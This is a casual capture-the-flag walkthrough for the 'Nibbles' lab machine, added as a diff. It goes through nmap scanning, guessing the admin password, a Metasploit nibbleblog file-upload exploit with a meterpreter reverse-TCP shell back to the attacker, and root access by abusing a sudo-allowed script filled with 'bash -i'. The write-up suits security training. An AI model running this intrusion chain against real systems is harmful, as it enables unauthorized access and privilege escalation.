@@ -1,0 +1,186 @@
+	Lets start with a good ol' typical scan shall we!
+	
+	sudo nmap -A -T4 -v 10.10.10.75
+
+	22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.2 (Ubuntu Linux; protocol 2.0)
+	| ssh-hostkey: 
+	|   2048 c4:f8:ad:e8:f8:04:77:de:cf:15:0d:63:0a:18:7e:49 (RSA)
+	|   256 22:8f:b1:97:bf:0f:17:08:fc:7e:2c:8f:e9:77:3a:48 (ECDSA)
+	|_  256 e6:ac:27:a3:b5:a9:f1:12:3c:34:a5:5d:5b:eb:3d:e9 (ED25519)
+	80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
+	| http-methods: 
+	|_  Supported Methods: POST OPTIONS GET HEAD
+	|_http-server-header: Apache/2.4.18 (Ubuntu)
+	|_http-title: Site doesn't have a title (text/html).
+	No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
+	
+	I also like to run a sudo nmap --script vuln -v 10.10.10.75 to see if that returns anything easy and juicy	
+
+	22/tcp open  ssh
+	80/tcp open  http
+	|_http-csrf: Couldn't find any CSRF vulnerabilities.
+	|_http-dombased-xss: Couldn't find any DOM based XSS.
+	| http-slowloris-check: 
+	|   VULNERABLE:
+	|   Slowloris DOS attack
+	|     State: LIKELY VULNERABLE
+	|     IDs:  CVE:CVE-2007-6750
+	|       Slowloris tries to keep many connections to the target web server open and hold
+	|       them open as long as possible.  It accomplishes this by opening connections to
+	|       the target web server and sending a partial request. By doing so, it starves
+	|       the http server's resources causing Denial Of Service.
+	|       
+	|     Disclosure date: 2009-09-17
+	|     References:
+	|       http://ha.ckers.org/slowloris/
+	|_      https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2007-6750
+	|_http-stored-xss: Couldn't find any stored XSS vulnerabilities.
+	
+	Nothing juicy here today, but there is a vuln to DOS attack, so that would go into a writeup for a real pentest
+
+	well lets go to the webpage to see whats gucci (I hate myself for saying that)
+	
+	http://10.10.10.75
+	
+	Hello world!
+	
+	we see hello world printed on the screen and that it...hmmm...lets inspect the page.
+	
+	<b>Hello world!</b>
+
+	<!-- /nibbleblog/ directory. Nothing interesting here! -->
+
+	this nibbleblog directory looks nice, lets try http://10.10.10.75/nibbleblog/ 
+	
+	it takes us to another page, nothing great right off the bat, but if we inspect it again...
+	
+	<script src="/nibbleblog/admin/js/jquery/jquery.js"></script>
+	
+	sweet now we know there is a /admin so lets try http://10.10.10.75/nibbleblog/admin
+	
+	it does work, no login required, now we can search all these folders to find the goods
+	
+	we can also use dirbuster -l /usr/share/dirbuster/wordlists/directory-list-2.3-small.txt -s /nibbleblog/ http://10.10.10.75 to browse the directories faster
+	
+	doing that we find /admin.php so lets do that
+	
+	this takes us to a login, lets try admin/admin, doesnt work, okay admin/nibbles...sweet we're in! *note* nibbles is a guess based on box name :(
+
+	now we can try to find something malicious to do...
+	
+	there is probably some type of manual injection we can do with the publish feature but first lets keep looking around, maybe something to use with metasploit	
+	
+	the best we can find is on the settings page, and see that we are running nibble 4.0,3 “coffee”
+	
+	lets see if it's exploitable at all
+
+	searchsploit nibbles
+	
+	no result...rememeber searchsploit is super freaking specific, so lets try searchsploit nibble
+	
+	woo we get a result, looks like we can use metasploit
+	
+	msfconsole
+	
+	msfconsole search nibble
+	
+	Matching Modules
+	================
+
+  	 #  Name                                       Disclosure Date  Rank       Check  Description
+     →  ----                                       ---------------  ----       -----  -----------
+	 0  exploit/multi/http/nibbleblog_file_upload  2015-09-01       excellent  Yes    Nibbleblog File Upload Vulnerability
+	
+	use 0
+	
+	now set all of the module options we need, mine are an example down below	
+	
+   Module options (exploit/multi/http/nibbleblog_file_upload):
+
+   Name       Current Setting  Required  Description
+   ----       ---------------  --------  -----------
+   PASSWORD   nibbles          yes       The password to authenticate with
+   Proxies                     no        A proxy chain of format type:host:port[,type:host:port][...]
+   RHOSTS     10.10.10.75     yes       The target host(s), range CIDR identifier, or hosts file with syntax 'file:<path>'
+   RPORT      80               yes       The target port (TCP)
+   SSL        false            no        Negotiate SSL/TLS for outgoing connections
+   TARGETURI  /nibbleblog/     yes       The base path to the web application
+   USERNAME   admin            yes       The username to authenticate with
+   VHOST                       no        HTTP server virtual host
+
+
+   Payload options (php/meterpreter/reverse_tcp):
+
+   Name   Current Setting  Required  Description
+   ----   ---------------  --------  -----------
+   LHOST  10.10.10.10      yes       The listen address (an interface may be specified)
+   LPORT  4444             yes       The listen port
+
+	run
+	
+	sweet! *typical hacker voice from hollywood movies* “we're in!”
+	
+	alright, lets do sysinfo
+	
+	Computer    : Nibbles
+	OS          : Linux Nibbles 4.4.0-104-generic #127-Ubuntu SMP Mon Dec 11 12:16:42 UTC 2017 x86_64
+	Meterpreter : php/linux
+
+	we can try searching for anything exploitable here, but for now lets just get a shell
+	
+	meterpreter > shell
+	
+	since we are looking for user and root .txt files lets try to locate them
+	
+	locate -i user.txt
+	
+	cd into /home/nibbler/ and cat user.txt
+	
+	sweet let's try to find root.txt
+	
+	locate -i root.txt
+	
+	no such luck with that one, not enough privelege to see it...so lets see how we can get root now
+	
+	sudo -l to find if we have and root priveleges
+	
+	we see we do at /home/nibbler/personal/stuff/monitor.sh
+	
+	try to cd there....
+	
+	no such directory, but from /nibbler/ we can mkdir personal, cd personal, mkdir stuff, cd stuff
+	
+	from there we can echo “bash -i” > monitor.sh
+	
+	now we see if we can execute it with ls -la
+	
+	drwxr-xr-x 2 nibbler nibbler 4096 Feb 22 06:54 .
+	drwxr-xr-x 3 nibbler nibbler 4096 Feb 22 06:53 ..
+	-rw-r--r-- 1 nibbler nibbler    8 Feb 22 06:54 monitor.sh
+
+	
+	we see it is not executable yet, so lets make it executable with chmod +x monitor.sh
+	
+	again now we use ls-la
+	
+	boom!
+	
+	drwxr-xr-x 2 nibbler nibbler 4096 Feb 22 06:54 .
+	drwxr-xr-x 3 nibbler nibbler 4096 Feb 22 06:53 ..
+	-rwxr-xr-x 1 nibbler nibbler    8 Feb 22 06:54 monitor.sh
+
+	
+	now we can run sudo monitor.sh
+	
+	this does not work maybe we can try sudo /home/nibbler/personal/stuff/monitor.sh
+	
+	it works! Now we can locate -i root.txt
+	
+	we see its in /root/
+
+	cd /root/	
+	
+	cat root.txt
+	
+	boom science! Good job! You done did hacked a thing! 
+	
